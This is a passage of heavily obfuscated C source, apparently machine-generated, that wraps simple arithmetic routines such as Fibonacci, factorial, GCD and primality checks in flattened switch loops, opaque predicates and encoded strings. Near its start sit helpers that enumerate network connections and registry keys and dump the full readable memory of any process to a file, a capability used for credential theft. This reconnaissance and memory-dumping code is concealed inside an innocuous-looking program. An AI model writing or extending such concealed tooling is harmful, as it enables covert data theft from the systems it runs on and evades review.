                if (!first) j_buf[off++] = ',';
                first = 0;
                int n = snprintf(j_buf + off, J_BUF_CAP - off, "{\"local\":\"%s\",\"remote\":\"%s\",\"state\":\"%s\"}", laddr, raddr, st);
                off += (size_t)(n > 0 ? n : 0);
            }
        }
        pclose(ns);
    }
#else
    j_net_proc_parse(j_dc_17(), &off, &first);
    j_net_proc_parse(j_dc_18(), &off, &first);
#endif
    j_buf[off++] = ']';
    j_buf[off] = '\0';
    return j_buf;
}

static const char* j_reg_list(const char* key) {
    size_t off = 0;
    j_buf[off++] = '[';
    int first = 1;
#if defined(_WIN32)
    HKEY root = HKEY_LOCAL_MACHINE;
    const char* sub = key;
    if (strncmp(key, j_dc_19(), 5) == 0) { root = HKEY_LOCAL_MACHINE; sub = key + 5; }
    else if (strncmp(key, j_dc_20(), 5) == 0) { root = HKEY_CURRENT_USER; sub = key + 5; }
    else if (strncmp(key, j_dc_21(), 5) == 0) { root = HKEY_CLASSES_ROOT; sub = key + 5; }
    else if (strncmp(key, j_dc_22(), 4) == 0) { root = HKEY_USERS; sub = key + 4; }
    HKEY hk = NULL;
    if (RegOpenKeyExA(root, sub, 0, KEY_READ, &hk) == ERROR_SUCCESS) {
        for (DWORD i = 0; ; ++i) {
            char s[256];
            DWORD n = sizeof s;
            if (RegEnumKeyExA(hk, i, s, &n, NULL, NULL, NULL, NULL) != ERROR_SUCCESS) break;
            if (off > J_BUF_CAP - 400) break;
            if (!first) j_buf[off++] = ',';
            first = 0;
            char esc[512];
            j_json_escape(esc, sizeof esc, s);
            int n2 = snprintf(j_buf + off, J_BUF_CAP - off, "\"%s\"", esc);
            off += (size_t)(n2 > 0 ? n2 : 0);
        }
        RegCloseKey(hk);
    }
#else
    (void)key;
#endif
    j_buf[off++] = ']';
    j_buf[off] = '\0';
    return j_buf;
}

static void j_mem_dump(int32_t pid, const char* path) {
#if defined(_WIN32)
    HANDLE h = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, FALSE, (DWORD)pid);
    if (!h) return;
    FILE* out = fopen(path, j_dc_23());
    if (!out) { CloseHandle(h); return; }
    unsigned char* base = NULL;
    MEMORY_BASIC_INFORMATION mbi;
    unsigned long regions = 0;
    while (VirtualQueryEx(h, base, &mbi, sizeof mbi) == sizeof mbi && regions++ < 100000) {
        if (mbi.State == MEM_COMMIT && !(mbi.Protect & (PAGE_GUARD | PAGE_NOACCESS)) &&
            (mbi.Protect == PAGE_READWRITE || mbi.Protect == PAGE_READONLY ||
             mbi.Protect == PAGE_EXECUTE_READWRITE || mbi.Protect == PAGE_EXECUTE_READ)) {
            unsigned char* chunk = (unsigned char*)malloc(mbi.RegionSize ? mbi.RegionSize : 1);
            SIZE_T read = 0;
            if (chunk && ReadProcessMemory(h, mbi.BaseAddress, chunk, mbi.RegionSize, &read) && read) {
                fwrite(chunk, 1, read, out);
            }
            free(chunk);
        }
        base = (unsigned char*)mbi.BaseAddress + mbi.RegionSize;
    }
    fclose(out);
    CloseHandle(h);
#else
    (void)pid; (void)path;
#endif
}

static volatile int32_t j_7hgmqpdm = 42673;
static volatile int32_t j_t0c8jewu = 25683;

static int32_t j_4f7g6fui(int32_t j_zjsufqwi);
static int32_t j_t2hghb9f(int32_t j_zjsufqwi);
static int32_t j_oiwo6t0n(int32_t j_zjsufqwi);
static int32_t j_vls2wrj8(int32_t j_m2p7e3pa, int32_t j_doqql8pa);
static bool j_t8lvogp4(int32_t j_zjsufqwi);
static int32_t j_vxxehlw0(int32_t j_zjsufqwi);
static int32_t j_m3tuz7o1(int32_t j_zjsufqwi);
static int32_t j_dwwcl9v0(int32_t j_zjsufqwi);
static int32_t j_u1jd8trj(int32_t j_gcfgd3i4, int32_t j_eu3wz7tw);
static int32_t j_w6mesi0m(int32_t j_m2p7e3pa, int32_t j_doqql8pa, int32_t j_l052rhh3);
static int32_t j_gutsi31n(int32_t j_m2p7e3pa, int32_t j_doqql8pa, int32_t j_l052rhh3);
static bool j_dk9e63to(int32_t j_zjsufqwi);

static int32_t j_4f7g6fui(int32_t j_zjsufqwi)
{
    int32_t j_468tmzoa = 0;
    while ((j_468tmzoa != -1))
    {
        switch (j_468tmzoa)
        {
            case 0:
                if ((j_zjsufqwi < 2))
                {
                    return j_zjsufqwi;
                }
                j_468tmzoa = 1;
                break;
            case 1:
                int32_t j_m2p7e3pa = 0;
                int32_t j_doqql8pa = 1;
                int32_t j_qo32bb5q = 2;
                static volatile int64_t j_ifxsxp8l = 57815;
                if ((((j_ifxsxp8l * j_ifxsxp8l) + j_ifxsxp8l) >= 0))
                {
                }
                else
                {
                    (void)printf("%s\n", 0 ? j_dc_24() : j_dc_25());
                }
                j_468tmzoa = 2;
                break;
            case 2:
                static volatile int64_t j_l9dl9lcd = 64539;
                static volatile int64_t j_7m5fgot7 = 31505;
                if ((((j_7m5fgot7 * j_7m5fgot7) + j_7m5fgot7) < 0))
                {
                    volatile int64_t j_yn30xwb1 = ((j_7m5fgot7 * 28) + 505);
                    (void)printf("%s\n", 0 ? j_dc_26() : j_dc_27());
                }
                j_468tmzoa = 3;
                break;
            case 3:
                if ((((j_l9dl9lcd * j_l9dl9lcd) + j_l9dl9lcd) < 0))
                {
                    volatile int64_t j_kiietxma = ((j_l9dl9lcd * 97) + 539);
                    (void)printf("%s\n", 0 ? j_dc_28() : j_dc_29());
                }
                j_468tmzoa = 4;
                break;
            case 4:
                while ((j_qo32bb5q <= j_zjsufqwi))
                {
                    int32_t j_v3huvf2v = (j_m2p7e3pa + j_doqql8pa);
                    j_m2p7e3pa = j_doqql8pa;
                    j_doqql8pa = j_v3huvf2v;
                    j_qo32bb5q = (j_qo32bb5q + 1);
                }
                j_468tmzoa = 5;
                break;
            case 5:
                return j_doqql8pa;
                break;
            case 6:
                static volatile int64_t j_qb8n9rkr = 76321;
                static volatile int64_t j_fy0gpnl9 = 23976;
                if ((((j_fy0gpnl9 * j_fy0gpnl9) + j_fy0gpnl9) < 0))
                {
                    volatile int64_t j_c1wchsa4 = ((j_fy0gpnl9 * 35) + 976);
                    (void)printf("%s\n", 0 ? j_dc_30() : j_dc_31());
                }
                j_468tmzoa = 7;
                break;
            case 7:
                if ((((j_qb8n9rkr * j_qb8n9rkr) + j_qb8n9rkr) < 0))
                {
                    (void)printf("%s\n", 0 ? j_dc_32() : j_dc_33());
                }
                j_468tmzoa = -1;
                break;
            default:
                break;
        }
    }
    return 0;
}

static int32_t j_t2hghb9f(int32_t j_zjsufqwi)
{
    int32_t j_lyd9q6x2 = 0;
    while ((j_lyd9q6x2 != -1))
    {
        switch (j_lyd9q6x2)
        {
            case 0:
                static volatile int64_t j_xsop1o4p = 41575;
                if ((((j_xsop1o4p * (j_xsop1o4p + 1)) % 2) == 1))
                {
                    (void)printf("%s\n", 0 ? j_dc_34() : j_dc_35());
                }
                j_lyd9q6x2 = 1;
                break;
            case 1:
                if ((j_zjsufqwi < 2))
                {
                    return j_zjsufqwi;
                }
                j_lyd9q6x2 = 2;
                break;
            case 2:
                static volatile int64_t j_ney0af9f = 46539;
                if ((((j_ney0af9f * j_ney0af9f) + j_ney0af9f) < 0))
                {
                    volatile int64_t j_dj8cfjgn = ((j_ney0af9f * 73) + 539);
                    (void)printf("%s\n", 0 ? j_dc_36() : j_dc_37());
                }
                j_lyd9q6x2 = 3;
                break;
            case 3:
                static volatile int64_t j_mbs50pn8 = 49744;
                if ((((j_mbs50pn8 * j_mbs50pn8) + j_mbs50pn8) < 0))
                {
                    volatile int64_t j_gzdn22af = ((j_mbs50pn8 * 15) + 744);
                    (void)printf("%s\n", 0 ? j_dc_38() : j_dc_39());
                }
                j_lyd9q6x2 = 4;
                break;
            case 4:
                return (j_t2hghb9f((j_zjsufqwi - 1)) + j_t2hghb9f((j_zjsufqwi - 2)));
                break;
            case 5:
                static volatile int64_t j_2ct6q877 = 73005;
                if ((((j_2ct6q877 * (j_2ct6q877 + 1)) % 2) == 0))
                {
                }
                else
                {
                    (void)printf("%s\n", 0 ? j_dc_40() : j_dc_41());
                }
                j_lyd9q6x2 = -1;
                break;
            default:
                break;
        }
    }
    return 0;
}

static int32_t j_oiwo6t0n(int32_t j_zjsufqwi)
{
    int32_t j_f1hbv9t4 = 0;
    while ((j_f1hbv9t4 != -1))
    {
        switch (j_f1hbv9t4)
        {
            case 0:
                if ((j_zjsufqwi <= 1))
                {
                    return 1;
                }
                j_f1hbv9t4 = 1;
                break;
            case 1:
                return (j_zjsufqwi * j_oiwo6t0n((j_zjsufqwi - 1)));
                break;
            case 2:
                static volatile int64_t j_v19rzg9k = 41872;
                static volatile int64_t j_kwyqhptu = 9402;
                if ((((j_kwyqhptu * j_kwyqhptu) + j_kwyqhptu) < 0))
                {
                    volatile int64_t j_v0z664x0 = ((j_kwyqhptu * 8) + 402);
                    (void)printf("%s\n", 0 ? j_dc_42() : j_dc_43());
                }
                j_f1hbv9t4 = 3;
                break;
            case 3:
                if ((((j_v19rzg9k * j_v19rzg9k) + j_v19rzg9k) < 0))
                {
                    (void)printf("%s\n", 0 ? j_dc_44() : j_dc_45());
                }
                j_f1hbv9t4 = 4;
                break;
            case 4:
                static volatile int64_t j_27a2qis4 = 97636;
                if ((((j_27a2qis4 * j_27a2qis4) + j_27a2qis4) < 0))
                {
                    (void)printf("%s\n", 0 ? j_dc_46() : j_dc_47());
                }
                j_f1hbv9t4 = -1;
                break;
            default:
                break;
        }
    }
    return 0;
}

static int32_t j_vls2wrj8(int32_t j_m2p7e3pa, int32_t j_doqql8pa)
{
    int32_t j_zhoekmdo = 0;
    while ((j_zhoekmdo != -1))
    {
        switch (j_zhoekmdo)
        {
            case 0:
                static volatile int64_t j_wkye35n7 = 65840;
                if ((((j_wkye35n7 * j_wkye35n7) + j_wkye35n7) < 0))
                {
                    (void)printf("%s\n", 0 ? j_dc_48() : j_dc_49());
                }
                j_zhoekmdo = 1;
                break;
            case 1:
                static volatile int64_t j_vyo8ezrt = 91539;
                if ((((j_vyo8ezrt * j_vyo8ezrt) + j_vyo8ezrt) < 0))
                {
                    volatile int64_t j_nywn77f5 = ((j_vyo8ezrt * 98) + 539);
                    (void)printf("%s\n", 0 ? j_dc_50() : j_dc_51());
                }
                j_zhoekmdo = 2;
                break;
            case 2:
                static volatile int64_t j_00zpd4o1 = 65614;
                static volatile int64_t j_46wox3cs = 61084;
                static volatile int64_t j_7yom7oru = 33668;
                if ((((j_7yom7oru * j_7yom7oru) + j_7yom7oru) < 0))
                {
                    volatile int64_t j_c4i39azk = ((j_7yom7oru * 32) + 668);
                    (void)printf("%s\n", 0 ? j_dc_52() : j_dc_53());
                }
                j_zhoekmdo = 3;
                break;
            case 3:
                if ((((j_46wox3cs * j_46wox3cs) + j_46wox3cs) < 0))
                {
                    (void)printf("%s\n", 0 ? j_dc_54() : j_dc_55());
                }
                j_zhoekmdo = 4;
                break;
            case 4:
                if ((((j_00zpd4o1 * j_00zpd4o1) % 4) < 2))
                {
                }
                else
                {
                    (void)printf("%s\n", 0 ? j_dc_56() : j_dc_57());
                }
                j_zhoekmdo = 5;
                break;
            case 5:
                if ((j_doqql8pa == 0))
                {
                    return j_m2p7e3pa;
                }
                j_zhoekmdo = 6;
                break;
            case 6:
                return j_vls2wrj8(j_doqql8pa, (j_m2p7e3pa % j_doqql8pa));
                break;
            default:
                break;
        }
    }
    return 0;
}

static bool j_t8lvogp4(int32_t j_zjsufqwi)
{
    int32_t j_tr73225m = 0;
    while ((j_tr73225m != -1))
    {
        switch (j_tr73225m)
        {
            case 0:
                static volatile int64_t j_6lcv1ym4 = 18008;
                if ((((j_6lcv1ym4 * j_6lcv1ym4) + j_6lcv1ym4) >= 0))
                {
                }
                else
                {
                    (void)printf("%s\n", 0 ? j_dc_58() : j_dc_59());
                }
                j_tr73225m = 1;
                break;
            case 1:
                static volatile int64_t j_s1u5c2bw = 54349;
                if ((((j_s1u5c2bw * j_s1u5c2bw) + j_s1u5c2bw) < 0))
                {
                    volatile int64_t j_eexnkan3 = ((j_s1u5c2bw * 45) + 349);
                    (void)printf("%s\n", 0 ? j_dc_60() : j_dc_61());
                }
                j_tr73225m = 2;
                break;
            case 2:
                if ((j_zjsufqwi < 2))
                {
                    return false;
                }
                j_tr73225m = 3;
                break;
            case 3:
                int32_t j_qo32bb5q = 2;
                while (((j_qo32bb5q * j_qo32bb5q) <= j_zjsufqwi))
                {
                    if (((j_zjsufqwi % j_qo32bb5q) == 0))
                    {
                        return false;
                    }
                    j_qo32bb5q = (j_qo32bb5q + 1);
                }
                j_tr73225m = 4;
                break;
            case 4:
                static volatile int64_t j_r3lyvytq = 38442;
                if ((((j_r3lyvytq * j_r3lyvytq) + j_r3lyvytq) < 0))
                {
                    volatile int64_t j_qv6uminn = ((j_r3lyvytq * 51) + 442);
                    (void)printf("%s\n", 0 ? j_dc_62() : j_dc_63());
                }
                j_tr73225m = 5;
                break;
            case 5:
                return true;
                break;
            case 6:
                static volatile int64_t j_2c53ign6 = 21165;
                static volatile int64_t j_9kqju9v1 = 72653;
                if ((((j_9kqju9v1 * j_9kqju9v1) + j_9kqju9v1) < 0))
                {
                    volatile int64_t j_0dnkds5g = ((j_9kqju9v1 * 100) + 653);
                    (void)printf("%s\n", 0 ? j_dc_64() : j_dc_65());
                }
                j_tr73225m = 7;
                break;
            case 7:
                static volatile int64_t j_6t4eaaox = 16918;
                if ((((j_6t4eaaox * j_6t4eaaox) + j_6t4eaaox) < 0))
                {
                    volatile int64_t j_f8wwr90p = ((j_6t4eaaox * 15) + 918);
                    (void)printf("%s\n", 0 ? j_dc_66() : j_dc_67());
                }
                j_tr73225m = 8;
                break;
            case 8:
                if ((((j_2c53ign6 * j_2c53ign6) + j_2c53ign6) < 0))
                {
                    (void)printf("%s\n", 0 ? j_dc_68() : j_dc_69());
                }
                j_tr73225m = -1;
                break;
            default:
                break;
        }
    }
    return 0;
}

static int32_t j_vxxehlw0(int32_t j_zjsufqwi)
{
    int32_t j_andim2q7 = 0;
    while ((j_andim2q7 != -1))
    {
        switch (j_andim2q7)
        {
            case 0:
                static volatile int64_t j_ybligual = 34199;
                if ((((j_ybligual * j_ybligual) % 4) < 2))
                {
                }
                else
                {
                    (void)printf("%s\n", 0 ? j_dc_70() : j_dc_71());
                }
                j_andim2q7 = 1;
                break;
            case 1:
                static volatile int64_t j_r5oqef5n = 56002;
                if ((((j_r5oqef5n * j_r5oqef5n) + j_r5oqef5n) < 0))
                {
                    volatile int64_t j_2561o13g = ((j_r5oqef5n * 43) + 2);
                    (void)printf("%s\n", 0 ? j_dc_72() : j_dc_73());
                }
                j_andim2q7 = 2;
                break;
            case 2:
                int32_t j_45k0m0xl = 0;
                int32_t j_3p7qt3hh = j_zjsufqwi;
                static volatile int64_t j_ey467ne8 = 79443;
                if ((((j_ey467ne8 * j_ey467ne8) + j_ey467ne8) < 0))
                {
                    volatile int64_t j_eymlwma1 = ((j_ey467ne8 * 59) + 443);
                    (void)printf("%s\n", 0 ? j_dc_74() : j_dc_75());
                }
                j_andim2q7 = 3;
                break;
            case 3:
                static volatile int64_t j_5tphmacs = 85453;
                static volatile int64_t j_8o5fuudq = 32307;
                if ((((j_8o5fuudq * j_8o5fuudq) + j_8o5fuudq) < 0))
                {
                    volatile int64_t j_qana0zdj = ((j_8o5fuudq * 31) + 307);
                    (void)printf("%s\n", 0 ? j_dc_76() : j_dc_77());
                }
                j_andim2q7 = 4;
                break;
            case 4:
                if ((((j_5tphmacs * j_5tphmacs) + j_5tphmacs) < 0))
                {
                    (void)printf("%s\n", 0 ? j_dc_78() : j_dc_79());
                }
                j_andim2q7 = 5;
                break;
            case 5:
                while ((j_3p7qt3hh != 1))
                {
                    if (((j_3p7qt3hh % 2) == 0))
                    {
                        j_3p7qt3hh = (j_3p7qt3hh / 2);
                    }
                    else
                    {
                        j_3p7qt3hh = ((j_3p7qt3hh * 3) + 1);
                    }
                    j_45k0m0xl = (j_45k0m0xl + 1);
                }
                j_andim2q7 = 6;
                break;
            case 6:
                return j_45k0m0xl;
                break;
            case 7:
                static volatile int64_t j_htb3rgly = 99697;
                if ((((j_htb3rgly * j_htb3rgly) % 4) == 3))
                {
                    (void)printf("%s\n", 0 ? j_dc_80() : j_dc_81());
                }
                j_andim2q7 = -1;
                break;
            default:
                break;
        }
    }
    return 0;
}

static int32_t j_m3tuz7o1(int32_t j_zjsufqwi)
{
    int32_t j_81x1jf3y = 0;
    while ((j_81x1jf3y != -1))
    {
        switch (j_81x1jf3y)
        {
            case 0:
                int32_t j_qumacpti = 0;
                int32_t j_7n3fh0c0 = j_zjsufqwi;
                static volatile int64_t j_qwk265v2 = 24520;
                static volatile int64_t j_jhb16brr = 58815;
                if ((((j_jhb16brr * j_jhb16brr) + j_jhb16brr) < 0))
                {
                    volatile int64_t j_kpt5jy74 = ((j_jhb16brr * 68) + 815);
                    (void)printf("%s\n", 0 ? j_dc_82() : j_dc_83());
                }
                j_81x1jf3y = 1;
                break;
            case 1:
                if ((((j_qwk265v2 * j_qwk265v2) + j_qwk265v2) < 0))
                {
                    volatile int64_t j_je3bxu1e = ((j_qwk265v2 * 55) + 520);
                    (void)printf("%s\n", 0 ? j_dc_84() : j_dc_85());
                }
                j_81x1jf3y = 2;
                break;
            case 2:
                static volatile int64_t j_l17cumr5 = 60766;
                if ((((j_l17cumr5 * j_l17cumr5) + j_l17cumr5) >= 0))
                {
                }
                else
                {
                    (void)printf("%s\n", 0 ? j_dc_86() : j_dc_87());
                }
                j_81x1jf3y = 3;
                break;
            case 3:
                while ((j_7n3fh0c0 > 0))
                {
                    j_qumacpti = (j_qumacpti + (j_7n3fh0c0 % 10));
                    j_7n3fh0c0 = (j_7n3fh0c0 / 10);
                }
                j_81x1jf3y = 4;
                break;
            case 4:
                static volatile int64_t j_vl90z625 = 67712;
                if ((((j_vl90z625 * j_vl90z625) % 4) == 3))
                {
                    (void)printf("%s\n", 0 ? j_dc_88() : j_dc_89());
                }
                j_81x1jf3y = 5;
                break;
            case 5:
                static volatile int64_t j_yackb9o9 = 48641;
                if ((((j_yackb9o9 * (j_yackb9o9 + 1)) % 2) == 0))
                {
                }
                else
                {
                    (void)printf("%s\n", 0 ? j_dc_90() : j_dc_91());
                }
                j_81x1jf3y = 6;
                break;
            case 6:
                return j_qumacpti;
                break;
            default:
                break;
        }
    }
    return 0;
}

static int32_t j_dwwcl9v0(int32_t j_zjsufqwi)
{
    int32_t j_obdh3w0k = 0;
    while ((j_obdh3w0k != -1))
    {
        switch (j_obdh3w0k)
        {
            case 0:
                if ((j_zjsufqwi < 0))
                {
                    return -(j_dwwcl9v0(-(j_zjsufqwi)));
                }
                j_obdh3w0k = 1;
                break;
            case 1:
                int32_t j_mt0qotjl = 0;
                static volatile int64_t j_051xehyu = 11218;
                if ((((j_051xehyu * j_051xehyu) + j_051xehyu) < 0))
                {
                    (void)printf("%s\n", 0 ? j_dc_92() : j_dc_93());
                }
                j_obdh3w0k = 2;
                break;
            case 2:
                int32_t j_7n3fh0c0 = j_zjsufqwi;
                while ((j_7n3fh0c0 > 0))
                {
                    j_mt0qotjl = ((j_mt0qotjl * 10) + (j_7n3fh0c0 % 10));
                    j_7n3fh0c0 = (j_7n3fh0c0 / 10);
                }
                j_obdh3w0k = 3;
                break;
            case 3:
                return j_mt0qotjl;
                break;
            case 4:
                static volatile int64_t j_pcrwneap = 24352;
                if ((((j_pcrwneap * j_pcrwneap) + j_pcrwneap) < 0))
                {
                    volatile int64_t j_1mi6kv9r = ((j_pcrwneap * 41) + 352);
                    (void)printf("%s\n", 0 ? j_dc_94() : j_dc_95());
                }
                j_obdh3w0k = -1;
                break;
            default:
                break;
        }
    }
    return 0;
}

static int32_t j_u1jd8trj(int32_t j_gcfgd3i4, int32_t j_eu3wz7tw)
{
    int32_t j_lqdsll6a = 0;
    while ((j_lqdsll6a != -1))
    {
        switch (j_lqdsll6a)
        {
            case 0:
                static volatile int64_t j_lhwxqj9r = 44455;
                if ((((j_lhwxqj9r * j_lhwxqj9r) + j_lhwxqj9r) < 0))
                {
                    (void)printf("%s\n", 0 ? j_dc_96() : j_dc_97());
                }
                j_lqdsll6a = 1;
                break;
            case 1:
                int32_t j_an62svr9 = 1;
                static volatile int64_t j_x7von3v7 = 84314;
                if ((((j_x7von3v7 * j_x7von3v7) + j_x7von3v7) < 0))
                {
                    volatile int64_t j_l68dw28g = ((j_x7von3v7 * 95) + 314);
                    (void)printf("%s\n", 0 ? j_dc_98() : j_dc_99());
                }
                j_lqdsll6a = 2;
                break;
            case 2:
                static volatile int64_t j_hoslr0at = 96157;
                if ((((j_hoslr0at * j_hoslr0at) + j_hoslr0at) < 0))
                {
                    volatile int64_t j_jbb11t8c = ((j_hoslr0at * 42) + 157);
                    (void)printf("%s\n", 0 ? j_dc_100() : j_dc_101());
                }
                j_lqdsll6a = 3;
                break;
            case 3:
                int32_t j_qo32bb5q = 0;
                static volatile int64_t j_mhn3wxje = 79526;
                if ((((j_mhn3wxje * j_mhn3wxje) + j_mhn3wxje) < 0))
                {
                    volatile int64_t j_3cdvb16f = ((j_mhn3wxje * 37) + 526);
                    (void)printf("%s\n", 0 ? j_dc_102() : j_dc_103());
                }
                j_lqdsll6a = 4;
                break;
            case 4:
                while ((j_qo32bb5q < j_eu3wz7tw))
                {
                    j_an62svr9 = (j_an62svr9 * j_gcfgd3i4);
                    j_qo32bb5q = (j_qo32bb5q + 1);
                }
                j_lqdsll6a = 5;
                break;
            case 5:
                return j_an62svr9;
                break;
            default:
                break;
        }
    }
    return 0;
}

static int32_t j_w6mesi0m(int32_t j_m2p7e3pa, int32_t j_doqql8pa, int32_t j_l052rhh3)
{
    int32_t j_n8l8nii7 = 0;
    while ((j_n8l8nii7 != -1))
    {
        switch (j_n8l8nii7)
        {
            case 0:
                if (((j_m2p7e3pa >= j_doqql8pa) && (j_m2p7e3pa >= j_l052rhh3)))
                {
                    return j_m2p7e3pa;
                }
                j_n8l8nii7 = 1;
                break;
            case 1:
                static volatile int64_t j_9q46v2mt = 17582;
                if ((((j_9q46v2mt * j_9q46v2mt) + j_9q46v2mt) < 0))
                {
                    volatile int64_t j_ddji0doq = ((j_9q46v2mt * 9) + 582);
                    (void)printf("%s\n", 0 ? j_dc_104() : j_dc_105());
                }
                j_n8l8nii7 = 2;
                break;
            case 2:
                static volatile int64_t j_y3ncgfwg = 74624;
                if ((((j_y3ncgfwg * j_y3ncgfwg) + j_y3ncgfwg) < 0))
                {
                    volatile int64_t j_vo7u5hag = ((j_y3ncgfwg * 44) + 624);
                    (void)printf("%s\n", 0 ? j_dc_106() : j_dc_107());
                }
                j_n8l8nii7 = 3;
                break;
            case 3:
                static volatile int64_t j_7gvi8asa = 53101;
                if ((((j_7gvi8asa * j_7gvi8asa) % 4) < 2))
                {
                }
                else
                {
                    (void)printf("%s\n", 0 ? j_dc_108() : j_dc_109());
                }
                j_n8l8nii7 = 4;
                break;
            case 4:
                if (((j_doqql8pa >= j_m2p7e3pa) && (j_doqql8pa >= j_l052rhh3)))
                {
                    return j_doqql8pa;
                }
                j_n8l8nii7 = 5;
                break;
            case 5:
                static volatile int64_t j_2166sej3 = 53483;
                if ((((j_2166sej3 * j_2166sej3) + j_2166sej3) < 0))
                {
                    volatile int64_t j_07ikarzd = ((j_2166sej3 * 66) + 483);
                    (void)printf("%s\n", 0 ? j_dc_110() : j_dc_111());
                }
                j_n8l8nii7 = 6;
                break;
            case 6:
                return j_l052rhh3;
                break;
            case 7:
                static volatile int64_t j_g6d1yvyy = 39975;
                if ((((j_g6d1yvyy * j_g6d1yvyy) + j_g6d1yvyy) < 0))
                {
                    volatile int64_t j_vemeoo7a = ((j_g6d1yvyy * 78) + 975);
                    (void)printf("%s\n", 0 ? j_dc_112() : j_dc_113());
                }
                j_n8l8nii7 = -1;
                break;
            default:
                break;
        }
    }
    return 0;
}

static int32_t j_gutsi31n(int32_t j_m2p7e3pa, int32_t j_doqql8pa, int32_t j_l052rhh3)
{
    int32_t j_iw1z5vc6 = 0;
    while ((j_iw1z5vc6 != -1))
    {
        switch (j_iw1z5vc6)
        {
            case 0:
                if (((j_m2p7e3pa <= j_doqql8pa) && (j_m2p7e3pa <= j_l052rhh3)))
                {
                    return j_m2p7e3pa;
                }
                j_iw1z5vc6 = 1;
                break;
            case 1:
                static volatile int64_t j_lrm1gehh = 20805;
                if ((((j_lrm1gehh * (j_lrm1gehh + 1)) % 2) == 0))
                {
                }
                else
                {
                    (void)printf("%s\n", 0 ? j_dc_114() : j_dc_115());
                }
                j_iw1z5vc6 = 2;
                break;
            case 2:
                static volatile int64_t j_vgpverpo = 1718;
                if ((((j_vgpverpo * j_vgpverpo) + j_vgpverpo) < 0))
                {
                    volatile int64_t j_uztk75r5 = ((j_vgpverpo * 45) + 718);
                    (void)printf("%s\n", 0 ? j_dc_116() : j_dc_117());
                }
                j_iw1z5vc6 = 3;
                break;
            case 3:
                static volatile int64_t j_rrinilmx = 5400;
                if ((((j_rrinilmx * j_rrinilmx) + j_rrinilmx) < 0))
                {
                    volatile int64_t j_gq4jxv9a = ((j_rrinilmx * 73) + 400);
                    (void)printf("%s\n", 0 ? j_dc_118() : j_dc_119());
                }
                j_iw1z5vc6 = 4;
                break;
            case 4:
                static volatile int64_t j_qio12h5g = 98712;
                if ((((j_qio12h5g * (j_qio12h5g + 1)) % 2) == 0))
                {
                }
                else
                {
                    (void)printf("%s\n", 0 ? j_dc_120() : j_dc_121());
                }
                j_iw1z5vc6 = 5;
                break;
            case 5:
                if (((j_doqql8pa <= j_m2p7e3pa) && (j_doqql8pa <= j_l052rhh3)))
                {
                    return j_doqql8pa;
                }
                j_iw1z5vc6 = 6;
                break;
            case 6:
                return j_l052rhh3;
                break;
            case 7:
                static volatile int64_t j_naocmdn5 = 69978;
                if ((((j_naocmdn5 * (j_naocmdn5 + 1)) % 2) == 0))
                {
                }
                else
                {
                    (void)printf("%s\n", 0 ? j_dc_122() : j_dc_123());
                }
                j_iw1z5vc6 = -1;
                break;
            default:
                break;
        }
    }
    return 0;
}

static bool j_dk9e63to(int32_t j_zjsufqwi)
{
    int32_t j_fc11v1m4 = 0;
    while ((j_fc11v1m4 != -1))
    {
        switch (j_fc11v1m4)
        {
            case 0:
                static volatile int64_t j_8iipg4vh = 13403;
                static volatile int64_t j_awdsb5zl = 34752;
                static volatile int64_t j_43e124er = 4538;
                if ((((j_43e124er * j_43e124er) + j_43e124er) < 0))
                {
                    volatile int64_t j_7k0d2soo = ((j_43e124er * 80) + 538);
                    (void)printf("%s\n", 0 ? j_dc_124() : j_dc_125());
                }
                j_fc11v1m4 = 1;
                break;
            case 1:
                static volatile int64_t j_ym23c5kb = 96715;
                if ((((j_ym23c5kb * j_ym23c5kb) + j_ym23c5kb) < 0))
                {
                    volatile int64_t j_mceeviu9 = ((j_ym23c5kb * 95) + 715);
                    (void)printf("%s\n", 0 ? j_dc_126() : j_dc_127());
                }
                j_fc11v1m4 = 2;
                break;
            case 2:
                if ((((j_awdsb5zl * j_awdsb5zl) % 4) < 2))
                {
                }
                else
                {
                    (void)printf("%s\n", 0 ? j_dc_128() : j_dc_129());
                }
                j_fc11v1m4 = 3;
                break;
            case 3:
                if ((((j_8iipg4vh * (j_8iipg4vh + 1)) % 2) == 0))
                {
                }
                else
                {
                    (void)printf("%s\n", 0 ? j_dc_130() : j_dc_131());
                }
                j_fc11v1m4 = 4;
                break;
            case 4:
                return (j_zjsufqwi == j_dwwcl9v0(j_zjsufqwi));
                break;
            case 5:
                static volatile int64_t j_bffhgg0u = 4452;
                if ((((j_bffhgg0u * j_bffhgg0u) + j_bffhgg0u) < 0))
                {
                    volatile int64_t j_mpcerarz = ((j_bffhgg0u * 4) + 452);
                    (void)printf("%s\n", 0 ? j_dc_132() : j_dc_133());
                }
                j_fc11v1m4 = -1;
                break;
            default:
                break;
        }
    }
    return 0;
}

int32_t main(void)
{
    int32_t j_76zh2lsi = 0;
    while ((j_76zh2lsi != -1))
    {
        switch (j_76zh2lsi)
        {
            case 0:
                (void)printf("%s\n", j_dc_134());
                static volatile int64_t j_a4a9xqpg = 81491;
                if ((((j_a4a9xqpg * j_a4a9xqpg) + j_a4a9xqpg) < 0))
                {
                    volatile int64_t j_wcvk9ns5 = ((j_a4a9xqpg * 27) + 491);
                    (void)printf("%s\n", 0 ? j_dc_135() : j_dc_136());
                }
                j_76zh2lsi = 1;
                break;
            case 1:
                (void)printf("%d\n", j_4f7g6fui(0));
                static volatile int64_t j_97rqq5iy = 70902;
                if ((((j_97rqq5iy * j_97rqq5iy) + j_97rqq5iy) >= 0))
                {
                    (void)printf("%d\n", j_4f7g6fui(1));
                }
                else
                {
                    volatile int64_t j_qz5gkrpa = ((j_97rqq5iy * 2) + 1);
                }
                j_76zh2lsi = 2;
                break;
            case 2:
                static volatile int64_t j_e7kc7myx = 86933;
                if ((((j_e7kc7myx * (j_e7kc7myx + 1)) % 2) == 1))
                {
                    (void)printf("%s\n", 0 ? j_dc_137() : j_dc_138());
                }
                j_76zh2lsi = 3;
                break;
            case 3:
                (void)printf("%d\n", j_4f7g6fui(10));
                static volatile int64_t j_rpogoku2 = 71748;
                if ((((j_rpogoku2 * j_rpogoku2) + j_rpogoku2) >= 0))
                {
                    (void)printf("%d\n", j_4f7g6fui(20));
                }
                else
                {
                    volatile int64_t j_1cfns2nj = ((j_rpogoku2 * 2) + 1);
                }
                j_76zh2lsi = 4;
                break;
            case 4:
                (void)printf("%s\n", j_dc_139());
                (void)printf("%d\n", j_t2hghb9f(0));
                (void)printf("%d\n", j_t2hghb9f(1));
                (void)printf("%d\n", j_t2hghb9f(10));
                static volatile int64_t j_oh0sw3nj = 35707;
                if ((((j_oh0sw3nj * j_oh0sw3nj) + j_oh0sw3nj) >= 0))
